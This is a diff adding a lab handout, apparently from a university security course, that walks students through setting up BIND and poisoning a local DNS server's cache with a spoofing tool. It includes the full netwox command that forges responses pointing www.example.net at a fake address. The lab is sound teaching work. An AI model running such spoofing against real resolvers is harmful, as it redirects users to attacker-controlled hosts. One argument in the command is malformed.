@@ -1,0 +1,74 @@
+Environment set up
+========================================
+Start 3 VMs: local DNS server, user, and attacker (You can use two VMs that merge the user and attacker) They should use NAT-Netowrk as the Internet adapter
+-------------------------------------------------
+
+On the local DNS server machine:
+-------------------------------------------------
+Download the named.conf.options from piazza and cd to locate the path.
+   $ sudo cp named.conf.options /etc/bind/
+   $ sudo chown bind /etc/bind/named.conf.options
+   $ sudo chown bind /var/cache/bind/dump.db
+   $ sudo chgrp bind /var/cache/bind/dump.db
+
+Restart the server to let the configuration taking effect
+-------------------------------------------------
+   $ sudo service bind9 restart
+
+
+On the user/attacker machine:
+-------------------------------------------------
+1.On the dashboard, search System Settings
+2.Click "System Settings" -> "Network",
+3.Click "Options" in "Wired" Tab,
+4.Select "IPv4 Settings" -> "Method" ->"Automatic(DHCP) Addresses Only" and update only "DNS Servers" entry with IP address of BIND DNS Server.
+5.Click the "Network Icon" on the top right corner and Select "Wired Connection X". This will refresh the wired network connection and updates the changes.
+
+
+Task A
+========================================
+On the user machine: play with the dig command
+-------------------------------------------------
+   $ dig www.example.com
+-------------------------------------------------
+1. Understand what each section means.
+2. Try to find out the time spent on the query when we repeat the same query.
+3. Go through the iterative query.
+
+
+
+Task B: local DNS cache poisoning
+========================================
+*Pre-assumption: the cache doesn't include the target domain.
+On the local DNS server: flush the cache to validate the assumption.
+-------------------------------------------------
+   $ sudo rndc flush
+-------------------------------------------------
+The command has to be runned every time before you repeat this task.
+
+
+On the attacker machine
+-------------------------------------------------
+   $ sudo netwox 105 --hostname "www.example.net"-hostnameip "10.20.30.40" --authns "ns.example.net" --authnsip "10.20.30.50" --ttl 19000 --filter "src host <localDNS_server IP>" --spoofip "raw"
+-------------------------------------------------
+Please replace <localDNS_server IP> with your own local DNS server's IP address
+
+On the user machine
+-------------------------------------------------
+   $ dig www.example.net
+-------------------------------------------------
+review the result if it is successful. close the program on the attacker and dig again.
+
+
+On the local DNS server
+-------------------------------------------------
+if it is successfuly, use the command to update the cache dump
+   $ sudo rndc dumpdb -cache
+Open the dump file to see the cache
+   $ cat /var/cache/bind/dump.db | grep "www.example.net"
+-------------------------------------------------
+-------------------------------------------------
+Notice:if your attack fails, you need to flush the server cache and try again.
+
+
+
